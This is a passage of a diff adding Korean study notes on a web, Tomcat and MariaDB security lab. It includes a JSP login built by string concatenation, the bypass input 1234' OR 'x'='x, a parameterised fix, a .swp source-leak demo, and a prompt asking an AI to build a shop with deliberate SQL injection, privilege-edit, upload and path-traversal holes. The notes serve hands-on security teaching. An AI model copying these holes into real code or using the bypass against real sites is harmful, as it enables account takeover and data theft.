+                placeholder=&quot;이메일을 입력하세요&quot;
+                required
+              /&gt;
+            &lt;/div&gt;
+
+            &lt;div class=&quot;login-page__input-wrap&quot;&gt;
+              &lt;span class=&quot;login-page__input-icon&quot;&gt;
+                &lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;1.8&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;
+                  &lt;rect x=&quot;5&quot; y=&quot;11&quot; width=&quot;14&quot; height=&quot;11&quot; rx=&quot;2&quot;/&gt;
+                  &lt;path d=&quot;M8 11V7a4 4 0 0 1 8 0v4&quot;/&gt;
+                &lt;/svg&gt;
+              &lt;/span&gt;
+              &lt;input
+                class=&quot;login-page__input&quot;
+                type=&quot;password&quot;
+                name=&quot;user_pw&quot;
+                placeholder=&quot;비밀번호를 입력하세요&quot;
+                required
+              /&gt;
+            &lt;/div&gt;
+          &lt;/div&gt;
+
+          &lt;button class=&quot;login-page__submit-btn&quot; type=&quot;submit&quot;&gt;로그인&lt;/button&gt;
+        &lt;/div&gt;
+
+&lt;!--
+        &lt;a class=&quot;login-page__signup-btn&quot; href=&quot;#&quot;&gt;이메일로 회원가입하기&lt;/a&gt;
+--&gt;
+      &lt;/form&gt;
+    &lt;/div&gt;
+  &lt;/main&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h5>login.jsp(→ login_pre.jsp)</h5>
+<pre><code class="language-java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; import=&quot;java.sql.*&quot; %&gt;
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
+
+&lt;%
+String uid = request.getParameter(&quot;user_id&quot;);
+String pwd = request.getParameter(&quot;user_pw&quot;);
+String DB_URL = &quot;jdbc:mariadb://192.168.6.131:3306/myapp&quot;;
+String DB_USER = &quot;wasuser&quot;;
+String DB_PASSWORD = &quot;password123&quot;;
+String sel=&quot;&quot;;
+ResultSet rs = null;
+Connection conn;
+Statement stmt;
+
+try {
+    Class.forName(&quot;org.mariadb.jdbc.Driver&quot;);
+    conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
+    stmt = conn.createStatement();
+    // 사용자 정보 조회
+    sel = &quot;SELECT * FROM users WHERE username='&quot; + uid +&quot;'AND password='&quot; + pwd + &quot;'&quot;;
+    rs = stmt.executeQuery(sel);
+    if (rs.next()) {
+        out.println(&quot;Success&quot;);
+    }
+    else
+        out.println(&quot;Fail&quot;);
+    conn.close();
+} catch(Exception e) {
+    out.println(e.getMessage());
+}
+%&gt;
+</code></pre>
+<ul>
+<li><code>wget --post-data=&quot;user_id=aaa&amp;user_pw=1234&quot; http://192.168.6.128/login.jsp</code>
+<ul>
+<li>터미널에서 로그인 시도 → 성공적으로 진행됨</li>
+</ul>
+</li>
+</ul>
+<h4>🛠️ 500 응답 코드(<strong>Internal Server Error)</strong></h4>
+<h5>문제 상황</h5>
+<p><img src="/assets/imgs/notes/server-build-practice/40-image-39.png" alt="image.png" loading="lazy"></p>
+<ul>
+<li>500 응답 코드 → WAS(톰캣) 내부 코드 오류, JSP 문법 오류 등</li>
+<li>에러 메세지
+<ul>
+<li>languages라는 잘못된 속성 사용 → 코드에서 languages라고 잘못 작성</li>
+</ul>
+</li>
+</ul>
+<h5>코드 수정</h5>
+<pre><code class="language-sql">&lt;%@ page **language**=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; import=&quot;java.sql.*&quot; %&gt;
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
+
+...
+</code></pre>
+<h4>🛠️ 드라이버 참조 문제</h4>
+<h5>문제 상황</h5>
+<p><img src="/assets/imgs/notes/server-build-practice/41-image-40.png" alt="image.png" loading="lazy"></p>
+<ul>
+<li>성공 혹은 실패에 지정한 문자열이 아니라 위의 문자열이 출력됨</li>
+<li>드라이버 참고 코드 부분을 잘못 작성해서 제대로 참조하지 못함</li>
+</ul>
+<h5>코드 수정</h5>
+<pre><code class="language-sql">...
+try {
+    Class.forName(&quot;**org**.mariadb.jdbc.Driver&quot;);
+    ....
+</code></pre>
+<h2>미션</h2>
+<h3>미션 1 - SQL 인젝션 방지하기</h3>
+<blockquote>
+<h4>SQL Injection</h4>
+<hr />
+</blockquote>
+<ul>
+<li>SQL 인젝션(SQL Injection)은 웹 애플리케이션이 사용자 입력을 검증하지 않아, 공격자가 악의적인 SQL 문을 삽입하고 실행하게 만드는 대표적인 보안 취약점</li>
+<li>로그인 화면에서 비밀번호로 <code>1234' OR 'x'='x</code>를 보내면 로그인에 성공함
+⇒ <code>x=x</code>는 무조건 참이기 때문</li>
+<li>인젝션을 방지하기 위해서는 각각의 값을 명령어에 바로 넣는 것이 아니라 쌍따옴표로 묶어서 집어넣어줘야 함</li>
+<li><code>wget --post-data=”username=abcd&amp;password=1234” http://1.1.1.1/login.jsp</code>
+<ul>
+<li>위의 코드로 로그인 시도 가능</li>
+<li>패스워드 파일을 가져와서 n초에 한번씩 시도하는 무작위 공격도 가능함</li>
+</ul>
+</li>
+</ul>
+<h5>코드</h5>
+<pre><code class="language-java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; import=&quot;java.sql.*&quot; %&gt;
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
+
+&lt;%
+String uid = request.getParameter(&quot;user_id&quot;);
+String pwd = request.getParameter(&quot;user_pw&quot;);
+String DB_URL = &quot;jdbc:mariadb://192.168.6.131:3306/myapp&quot;;
+String DB_USER = &quot;wasuser&quot;;
+String DB_PASSWORD = &quot;password123&quot;;
+String sel=&quot;&quot;;
+ResultSet rs = null;
+Connection conn;
+
+// 인젝션 방지
+PreparedStatement pstmt = null;
+
+try {
+    Class.forName(&quot;org.mariadb.jdbc.Driver&quot;);
+    conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
+    // 사용자 정보 조회
+    **String sql = &quot;SELECT * FROM users WHERE username=? AND password=?&quot;;
+    pstmt = conn.prepareStatement(sql);
+    pstmt.setString(1, uid);
+    pstmt.setString(2, pwd);
+    rs = pstmt.executeQuery();**
+    if (rs.next()) {
+        out.println(&quot;Success&quot;);
+    }
+    else
+        out.println(&quot;Fail&quot;);
+    conn.close();
+} catch(Exception e) {
+    out.println(e.getMessage());
+}
+%&gt;
+</code></pre>
+<ul>
+<li>SQL 인젝션을 시도해도 로그인에 실패하는 것을 확인할 수 있다.</li>
+</ul>
+<h3>미션 2 - 로그인 성공 시, mon.html 페이지 보여주기</h3>
+<h5>리다이렉트</h5>
+<p>: 사용자가 요청한 URL이 아닌 다른 URL로 접속을 자동으로 유도(재지시)하는 기술</p>
+<ul>
+<li>로그인에 성공한 경우 리다이렉트하면 원하는 페이지를 로드할 수 있다.<pre><code class="language-java">try {
+    ...
+    if (rs.next()) {
+        **response.sendRedirect(&quot;success.html&quot;);**
+        // out.println(&quot;Success&quot;);
+    }
+    else
+        response.sendRedirect(&quot;login.html&quot;);
+        // out.println(&quot;Fail&quot;);
+    conn.close();
+} catch(Exception e) {
+    out.println(e.getMessage());
+}
+</code></pre>
+<ul>
+<li>실습 서버가 달라서 이전에 작성한 mon.html이 없음 → 새로운 코드로 보여주기</li>
+</ul>
+</li>
+<li>결과
+<img src="/assets/imgs/notes/server-build-practice/42-image-41.png" alt="image.png" loading="lazy"></li>
+</ul>
+<h3>미션 3 - 인증 우회하기</h3>
+<ul>
+<li>mon.html에 로그인 없이 직접 접근해보자.</li>
+<li>그냥 url로 접근한다는 뜻 → 무슨 의미가 있는지 모르겠음 … ㅎ 내일 세션을 배우기 위한 발판 정도로 보면 될듯!</li>
+</ul>
+<p>현재 상태는 인증 인가에 대한 설정이 되어 있지 않아 url로 접근하면 접근이 된다! ⇒ 세션으로 제어해보자</p>
+<h3>미션 5 - 소스 탈취</h3>
+<h5>[보안] 백업파일, swp 파일 - 민감 정보 유출</h5>
+<ul>
+<li>만약 서비스 디렉토리에 백업 코드나 swp 파일이 있으면 웹 페이지로 소스코드에 접근이 가능하다. 코드 내에 DB 서버 주소 등의 민감주소가 있으면 문제가 된다.</li>
+<li>특히 swp 파일은 내 의지로 만드는 게 아닐 때가 많아서 조심해야 한다!
+<ul>
+<li>과정
+<ul>
+<li>swp 파일이 생성됨
+<img src="/assets/imgs/notes/server-build-practice/43-image-42.png" alt="image.png" loading="lazy"></li>
+<li><code>192.168.6.128/.login.jsp.swp</code> 접근
+<img src="/assets/imgs/notes/server-build-practice/44-image-43.png" alt="파일이 다운로드됨" loading="lazy">
+파일이 다운로드됨</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3>미션 6 - 망분리(WAS에 직접 접근 제한하기 (ufw 설정))</h3>
+<ul>
+<li>망분리 설정
+<table>
+<thead>
+<tr>
+<th>구분</th>
+<th>LAN카드</th>
+<th>추가 LAN카드</th>
+<th>IP 대역폭</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WEB</td>
+<td>Bridge</td>
+<td>NAT</td>
+<td>C (192.168.100.209)</td>
+</tr>
+<tr>
+<td>WAS</td>
+<td>NAT(vmnet8)</td>
+<td>host-only</td>
+<td>A (10.10.10.102)</td>
+</tr>
+<tr>
+<td>DB</td>
+<td>host-only(vmnet1)</td>
+<td>-</td>
+<td>B (172.16.10.100)</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+<pre><code class="language-mermaid">flowchart LR
+	외부&lt;--Bridge--&gt;WEB &lt;--NAT--&gt; WAS &lt;--host-only--&gt;DB
+</code></pre>
+<ul>
+<li>외부에서 접근할 수 있는 건 WEB서버(Bridge 모드로 할당받은 주소 → 외부에서 식별 가능)</li>
+<li>WEB과 WAS는 NAT 랜카드로 통신</li>
+<li>WAS와 DB는 host-only 랜카드로 통신</li>
+</ul>
+<h5>네트워크 구성</h5>
+<pre><code class="language-mermaid">flowchart LR
+	외부--&gt;방화벽--&gt;게이트웨이--&gt; 네트워크1 --&gt; WEB서버
+	게이트웨이--&gt; 네트워크2 --&gt; WAS서버
+	게이트웨이--&gt; 네트워크3 --&gt; DB서버
+</code></pre>
+<ul>
+<li>방화벽(게이트웨이)에 여러개의 랜카드가 존재 → 여러 네트워크에 있는 서버들과 통신</li>
+</ul>
+<h5>사설 IP 대역</h5>
+<table>
+<thead>
+<tr>
+<th><strong>클래스 [<a href="https://kldp.org/node/110155">1</a>, <a href="https://www.etnews.com/20230317000009">2</a>, <a href="https://surfshark.com/ko/blog/types-of-ip-addresses">3</a>, <a href="https://ko.wikipedia.org/wiki/%EC%82%AC%EC%84%A4%EB%A7%9D">4</a>]</strong></th>
+<th><strong>IP 주소 범위</strong></th>
+<th><strong>설명</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>A Class</strong></td>
+<td>10.0.0.0 ~ 10.255.255.255</td>
+<td>주로 대규모 네트워크나 기업 인트라넷에서 사용</td>
+</tr>
+<tr>
+<td><strong>B Class</strong></td>
+<td>172.16.0.0 ~ 172.31.255.255</td>
+<td>중형 규모 네트워크에서 사용</td>
+</tr>
+<tr>
+<td><strong>C Class</strong></td>
+<td>192.168.0.0 ~ 192.168.255.255</td>
+<td>일반 가정이나 소규모 사무실(와이파이 등)에서 가장 흔하게 사용</td>
+</tr>
+</tbody>
+</table>
+<h5>LAN 카드</h5>
+<p>: 컴퓨터나 기기를 인터넷 네트워크에 연결해 데이터를 주고받을 수 있게 해주는 하드웨어 장치</p>
+<ul>
+<li>네트워크 인터페이스 카드(NIC)라고 부르기도 함</li>
+<li>유선 방식과 무선 방식이 있음</li>
+</ul>
+<h5>VMware 네트워크 설정</h5>
+<ol>
+<li><code>edit&gt;Virtual Network Editor</code>
+<img src="/assets/imgs/notes/server-build-practice/45-image-44.png" alt="image.png" loading="lazy"></li>
+<li><code>Change Settings</code>
+<img src="/assets/imgs/notes/server-build-practice/46-image-45.png" alt="image.png" loading="lazy"></li>
+<li>네트워크 대역 설정 변경
+<img src="/assets/imgs/notes/server-build-practice/47-image-46.png" alt="image.png" loading="lazy">
+<img src="/assets/imgs/notes/server-build-practice/48-image-47.png" alt="image.png" loading="lazy">
+<img src="/assets/imgs/notes/server-build-practice/49-image-48.png" alt="image.png" loading="lazy">
+<img src="/assets/imgs/notes/server-build-practice/50-image-49.png" alt="NAT 모드였던 서버들이 끊긴 것을 확인" loading="lazy">
+NAT 모드였던 서버들이 끊긴 것을 확인</li>
+<li>서버 네트워크 설정
+<img src="/assets/imgs/notes/server-build-practice/51-image-50.png" alt="image.png" loading="lazy">
+<img src="/assets/imgs/notes/server-build-practice/52-image-51.png" alt="image.png" loading="lazy">
+<img src="/assets/imgs/notes/server-build-practice/53-image-52.png" alt="image.png" loading="lazy"></li>
+<li>VMware 서버 켜서 <code>sudo su</code>, <code>export LANG=</code>
+<ul>
+<li>언어 설정을 지워줘야 영어(디폴트)로 nmtui 설정 내용이 보임</li>
+<li>한글로 하면 깨져서 아예 안 보임</li>
+</ul>
+</li>
+<li><code>nmtui</code>로 네트워크 설정(IP 주소) 변경
+<ul>
+<li>WEB 서버
+<img src="/assets/imgs/notes/server-build-practice/54-image-53.png" alt="image.png" loading="lazy">
+<img src="/assets/imgs/notes/server-build-practice/55-image-54.png" alt="처음 설정에 들어가면 새로 추가한 LAN카드(ens37)는 이름이 없었음 ⇒ 내가 알아보기 쉽게 설정하자" loading="lazy">
+처음 설정에 들어가면 새로 추가한 LAN카드(ens37)는 이름이 없었음 ⇒ 내가 알아보기 쉽게 설정하자
+<img src="/assets/imgs/notes/server-build-practice/56-image-55.png" alt="WEB 서버 네트워크(Bridge) 설정" loading="lazy">
+WEB 서버 네트워크(Bridge) 설정
+<img src="/assets/imgs/notes/server-build-practice/57-image-56.png" alt="WEB 서버 LAN 카드(NAT) 설정" loading="lazy">
+WEB 서버 LAN 카드(NAT) 설정
+<img src="/assets/imgs/notes/server-build-practice/58-image-57.png" alt="나가기" loading="lazy">
+나가기</li>
+<li>WAS 서버 설정(기존 LAN카드는 NAT이라 그냥 쓰던대로 쓰면 된다)
+<img src="/assets/imgs/notes/server-build-practice/59-7948bd74-c382-433c-a254-94de56328a49.png" alt="WAS 서버 LAN카드(host-only) 설정" loading="lazy">
+WAS 서버 LAN카드(host-only) 설정</li>
+</ul>
+</li>
+<li><code>nmcli device reapply ens33(ens37)</code>으로 인터페이스 재부팅 후 ip 주소 확인
+<img src="/assets/imgs/notes/server-build-practice/60-image-58.png" alt="image.png" loading="lazy">
+<img src="/assets/imgs/notes/server-build-practice/61-image-59.png" alt="image.png" loading="lazy"></li>
+<li><code>ping</code>으로 통신이 되는 것을 확인</li>
+</ol>
+<h4>다른 사람들이 접속할 수 있도록 설정 수정하기</h4>
+<ol>
+<li>WEB: nginx 설정 변경
+<ol>
+<li>설정 변경<pre><code class="language-bash"># /etc/nginx/sites-available/default
+location / {
+        proxy_pass http://**10.10.10.102**:8080;
+        ...
+}
+</code></pre>
+</li>
+<li>시스템 재시작(매우 중요!)
+<ul>
+<li><code>systemctl daemon-reload &amp;&amp; systemctl restart nginx</code></li>
+</ul>
+</li>
+</ol>
+</li>
+<li>WAS: DB 서버 변경<pre><code class="language-bash"># /var/lib/tomcat10/webapps/ROOT/login.jsp
+&lt;%
+...
+String DB_URL = &quot;jdbc:mariadb://**172.16.10.100**:3306/myapp&quot;;
+%&gt;
+</code></pre>
+</li>
+<li>DB 권한 설정<pre><code class="language-bash">-- 새 IP로 동일 계정 권한 추가
+GRANT ALL PRIVILEGES ON myapp.* TO 'wasuser'@'**%**' IDENTIFIED BY 'password123';
+FLUSH PRIVILEGES;
+</code></pre>
+<ul>
+<li>mariadb에서는 모든 것을 의미하는 문자가 *이 아니라 %다!</li>
+</ul>
+</li>
+</ol>
+<h3>미션 7 - 세션 만들기 (로그인, 회원가입, 회원탈퇴, 자료실)</h3>
+<p><a href="https://app.notion.com/p/3772e080218f80f49335d6a5013ad329?pvs=21">쇼핑몰 사이트 제작</a></p>
+<ul>
+<li>코드는 최대한 간단하게!</li>
+</ul>
+<blockquote>
+<h4>세션이란?</h4>
+<hr />
+<p><a href="https://study0304.tistory.com/103"><strong>참고 블로그</strong></a> |</p>
+</blockquote>
+<h3>실습 개요</h3>
+<ul>
+<li>프롬프트
+세션을 만들어보려고 해. 프론트엔드는 nginx이고, 백엔드는 tomcat10이고 DB는 mariaDB야. 추후에 취약점을 방지하는 방향으로 실습을 진행할거야. 여러개를 만들건데, 내가 하나씩 만들어야 하는 걸 보내줄게. 일단 전체 서비스에 대해 보내줄테니까 어떤 코드들을 만들어야 하는지만 보내줘. 아직 코드를 작성하지는 말고 파일 구조 정도만 보내줘.
+세션 만들기: 로그인, 회원가입, 회원탈퇴, 회원 정보수정, 자료실
+<ul>
+<li>사용자 테이블에는 uname, passwd, profile, priority(0, 9) 컬럼을 포함해서 만들어줘. 명령어 실행은 내가 할테니까 명령어를 보내줘.</li>
+<li>로그인 시에는 DB 인젝션이 가능하도록 해줘</li>
+<li>회원 가입 시에는 비밀번호 길이 제한을 javascript로 체크해줘</li>
+<li>회원 정보 수정 시에는 회원 권한을 수정할 수 있는 취약점도 포함해줘</li>
+<li>자료실에는 파일 업로드 취약성, 다운로드 취약성을 포함해줘</li>
+</ul>
+</li>
+<li>파일 구조 및 테이블 구조
+<h4>MariaDB — 테이블 설계</h4>
+<pre><code>DB 스키마
+└── users 테이블
+    ├── uname (varchar)
+    ├── passwd (varchar)
+    ├── profile (varchar)
+    └── priority (int, 0=일반/9=관리자)
+└── products 테이블 (상품 페이지용)
+    ├── product_id
+    ├── name
+    ├── price
+    ├── description
+    └── image_name
+</code></pre>
+<hr />
+<ul>
+<li>기존 파일 구조(Nginx + Tomcat)
+<h4>Nginx — 프론트엔드 정적 파일</h4>
+<pre><code>/usr/share/nginx/html/
+├── index.html              ← 메인 (로그인/회원가입 링크)
+├── login.html              ← 로그인 폼
+├── register.html           ← 회원가입 폼 (JS 비밀번호 길이 체크)
+├── mypage.html             ← 회원 정보 수정 폼 (권한 수정 취약점 포함)
+└── product.html            ← 상품 페이지 (이미지 업로드/다운로드 폼)
+</code></pre>
+<hr />
+<h4>~~Tomcat10 — 백엔드 서블릿~~</h4>
+<pre><code>/opt/tomcat/webapps/ROOT/
+├── WEB-INF/
+│   ├── web.xml
+│   └── lib/
+│       └── mariadb-java-client.jar
+└── WEB-INF/classes/
+    ├── DBConnection.java           ← DB 연결 유틸
+    ├── LoginServlet.java           ← 로그인 처리 (SQL Injection 취약)
+    ├── RegisterServlet.java        ← 회원가입 처리
+    ├── UpdateServlet.java          ← 회원 정보 수정 (권한 수정 취약점)
+    ├── DeleteServlet.java          ← 회원 탈퇴
+    ├── ProductListServlet.java     ← 상품 목록 조회
+    ├── ProductUploadServlet.java   ← 상품 이미지 업로드 (확장자 검증 없음)
+    └── ProductDownloadServlet.java ← 상품 이미지 다운로드 (경로 탐색 취약점)
+</code></pre>
+<hr />
+<h4>Nginx 설정 — 리버스 프록시</h4>
+<pre><code>/etc/nginx/conf.d/
+└── app.conf        ← /api/* → Tomcat 8080 프록시 설정
+</code></pre>
+</li>
+</ul>
+<pre><code>사용자 브라우저
+      ↓ 80포트
+   Nginx (리버스 프록시만 담당)
+      ↓ 8080포트로 전달
+   Tomcat10 (/var/lib/tomcat10/webapps/ROOT/)
+      ├── login.html
+      ├── login.jsp
+      ├── register.html
+      ├── register.jsp
+      ├── mypage.html
+      ├── mypage.jsp
+      ├── product.html
+      ├── product.jsp
+      └── css/
+      ↓
+   MariaDB (172.16.10.100:3306)
+</code></pre>
+<hr />
+<h3>취약점 구현 포인트 요약</h3>
+<table>
+<thead>
+<tr>
+<th>기능</th>
+<th>취약점</th>
+<th>구현 방식</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>로그인</td>
+<td>SQL Injection</td>
+<td>Statement (PreparedStatement 미사용)</td>
+</tr>
+<tr>
+<td>회원가입</td>
+<td>클라이언트 검증만</td>
+<td>JS로만 길이 체크, 서버 검증 없음</td>
+</tr>
+<tr>
+<td>정보수정</td>
+<td>권한 수정</td>
+<td>priority 파라미터를 폼에서 직접 전송</td>
+</tr>
+<tr>
+<td>상품 이미지 업로드</td>
+<td>악성파일 업로드</td>
+<td>확장자·MIME 검증 없음</td>
+</tr>
+<tr>
+<td>상품 이미지 다운로드</td>
+<td>경로 탐색(Path Traversal)</td>
+<td>파일명 그대로 경로 결합</td>
+</tr>
+</tbody>
+</table>
+<hr />
+이 구조로 확정하고 DB 테이블 생성 명령어부터 시작할까요?</li>
+<li>네트워크 구조<pre><code>[외부/클라이언트]
+       ↓ 192.168.100.x 대역
+  [Nginx] 192.168.100.209 (ens33)
+          10.10.10.103    (ens37)
+               ↓ 10.10.10.x 대역
+  [Tomcat] 10.10.10.102  (ens33)
+           172.16.10.101  (ens37)
+                ↓ 172.16.10.x 대역
+  [DB]  172.16.10.100    (ens33)
+</code></pre>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>구분</th>
+<th>LAN카드</th>
+<th>추가 LAN카드</th>
+<th>IP 대역폭</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WEB</td>
+<td>Bridge</td>
+<td>NAT</td>
+<td>C (192.168.100.209)</td>
+</tr>
+<tr>
+<td>WAS</td>
+<td>NAT(vmnet8)</td>
+<td>host-only</td>
+<td>A (10.10.10.102)</td>
+</tr>
+<tr>
+<td>DB</td>
+<td>host-only(vmnet1)</td>
+<td>-</td>
+<td>B (172.16.10.100)</td>
+</tr>
+</tbody>
+</table>
+<h3>기존 버전(실습용)</h3>
+<h4>DB 테이블 생성</h4>
+<h5>0. 구조</h5>
+<pre><code>DB 스키마
+└── users 테이블
+    ├── uname (varchar)
+    ├── passwd (varchar)
+    ├── profile (varchar)
+    └── priority (int, 0=일반/9=관리자)
+└── products 테이블 (상품 페이지용)
+    ├── product_id
+    ├── name
+    ├── price
+    ├── description
+    └── image_name
+</code></pre>
+<h5>1. DB 및 사용자 생성</h5>
+<pre><code class="language-sql">CREATE DATABASE shopdb CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
+
+CREATE USER 'shopuser'@'localhost' IDENTIFIED BY 'shop1234';
+GRANT ALL PRIVILEGES ON shopdb.* TO 'shopuser'@'localhost';
+FLUSH PRIVILEGES;
+
+USE shopdb;
+</code></pre>
+<h5>2. users 테이블 생성</h5>
+<pre><code class="language-sql">CREATE TABLE users (
+    id       INT AUTO_INCREMENT PRIMARY KEY,
+    uname    VARCHAR(50)  NOT NULL UNIQUE,
+    passwd   VARCHAR(255) NOT NULL,
+    profile  VARCHAR(255) DEFAULT '',
+    priority INT          DEFAULT 0
+);
+</code></pre>
+<h5>3. products 테이블 생성</h5>
+<pre><code class="language-sql">CREATE TABLE products (
+    product_id  INT AUTO_INCREMENT PRIMARY KEY,
+    name        VARCHAR(100)  NOT NULL,
+    price       INT           NOT NULL DEFAULT 0,
+    description TEXT,
+    image_name  VARCHAR(255)  DEFAULT ''
+);
+</code></pre>
+<h5>4. 샘플 데이터 삽입</h5>
+<pre><code class="language-sql">
+</code></pre>
+<h5>5. 테이블 확인</h5>
+<pre><code class="language-sql">SHOW TABLES;
+SELECT * FROM users;
+SELECT * FROM products;
+</code></pre>
+<p><img src="/assets/imgs/notes/server-build-practice/62-image-60.png" alt="image.png" loading="lazy"></p>
+<h4>로그인 페이지</h4>
+<h5>login.html</h5>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;ko&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;로그인 - Shop&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/common.css&quot; /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div class=&quot;container&quot;&gt;
+    &lt;h2&gt;로그인&lt;/h2&gt;
+    &lt;form action=&quot;login.jsp&quot; method=&quot;post&quot;&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;아이디&lt;/label&gt;
+        &lt;input type=&quot;text&quot; name=&quot;uname&quot; /&gt;
+      &lt;/div&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;비밀번호&lt;/label&gt;
+        &lt;input type=&quot;password&quot; name=&quot;passwd&quot; /&gt;
+      &lt;/div&gt;
+
+      &lt;button type=&quot;submit&quot;&gt;로그인&lt;/button&gt;
+    &lt;/form&gt;
+
+    &lt;div class=&quot;link-row&quot;&gt;
+      &lt;a href=&quot;register.html&quot;&gt;회원가입&lt;/a&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h5>login.jsp</h5>
+<pre><code class="language-java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; import=&quot;java.sql.*&quot; %&gt;
+&lt;%
+    String uname  = request.getParameter(&quot;uname&quot;);
+    String passwd = request.getParameter(&quot;passwd&quot;);
+
+    String DB_URL      = &quot;jdbc:mariadb://172.16.10.100:3306/shopdb&quot;;
+    String DB_USER     = &quot;shopuser&quot;;
+    String DB_PASSWORD = &quot;shop1234&quot;;
+
+    Connection conn = null;
+    Statement  stmt = null;
+    ResultSet  rs   = null;
+
+    try {
+        Class.forName(&quot;org.mariadb.jdbc.Driver&quot;);
+        conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
+        stmt = conn.createStatement();
+
+        // ⚠️ 취약점: SQL Injection 가능 (Statement 사용, 입력값 검증 없음)
+        String sql = &quot;SELECT * FROM users WHERE uname='&quot; + uname + &quot;' AND passwd='&quot; + passwd + &quot;'&quot;;
+        rs = stmt.executeQuery(sql);
+
+        if (rs.next()) {
+            session.setAttribute(&quot;uname&quot;,    rs.getString(&quot;uname&quot;));
+            session.setAttribute(&quot;priority&quot;, rs.getInt(&quot;priority&quot;));
+            response.sendRedirect(&quot;product.html&quot;);
+        } else {
+            response.sendRedirect(&quot;login.html?error=1&quot;);
+        }
+
+    } catch (Exception e) {
+        out.println(&quot;오류: &quot; + e.getMessage());
+    } finally {
+        if (rs   != null) try { rs.close();   } catch (Exception e) {}
+        if (stmt != null) try { stmt.close();  } catch (Exception e) {}
+        if (conn != null) try { conn.close();  } catch (Exception e) {}
+    }
+%&gt;
+</code></pre>
+<ul>
+<li>SQL Injection 취약 코드</li>
+</ul>
+<h4>회원가입 페이지</h4>
+<h5>register.html</h5>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;ko&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;회원가입 - Shop&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/common.css&quot; /&gt;
+  &lt;script&gt;
+    function validateForm() {
+      const passwd = document.getElementById(&quot;passwd&quot;).value;
+      if (passwd.length &gt; 8) {
+        alert(&quot;비밀번호는 8자 이하로 입력해주세요.&quot;);
+        return false;
+      }
+      return true;
+    }
+  &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div class=&quot;container&quot;&gt;
+    &lt;h2&gt;회원가입&lt;/h2&gt;
+    &lt;form action=&quot;register.jsp&quot; method=&quot;post&quot; onsubmit=&quot;return validateForm()&quot;&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;아이디&lt;/label&gt;
+        &lt;input type=&quot;text&quot; name=&quot;uname&quot; required /&gt;
+      &lt;/div&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;비밀번호 (8자 이하)&lt;/label&gt;
+        &lt;input type=&quot;password&quot; name=&quot;passwd&quot; id=&quot;passwd&quot; required /&gt;
+      &lt;/div&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;프로필 소개&lt;/label&gt;
+        &lt;input type=&quot;text&quot; name=&quot;profile&quot; /&gt;
+      &lt;/div&gt;
+
+      &lt;button type=&quot;submit&quot;&gt;회원가입&lt;/button&gt;
+    &lt;/form&gt;
+
+    &lt;div class=&quot;link-row&quot;&gt;
+      &lt;a href=&quot;login.html&quot;&gt;로그인으로 돌아가기&lt;/a&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h5>register.jsp</h5>
+<pre><code class="language-java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; import=&quot;java.sql.*&quot; %&gt;
+&lt;%
+    String uname   = request.getParameter(&quot;uname&quot;);
+    String passwd  = request.getParameter(&quot;passwd&quot;);
+    String profile = request.getParameter(&quot;profile&quot;);
+
+    String DB_URL      = &quot;jdbc:mariadb://172.16.10.100:3306/shopdb&quot;;
+    String DB_USER     = &quot;shopuser&quot;;
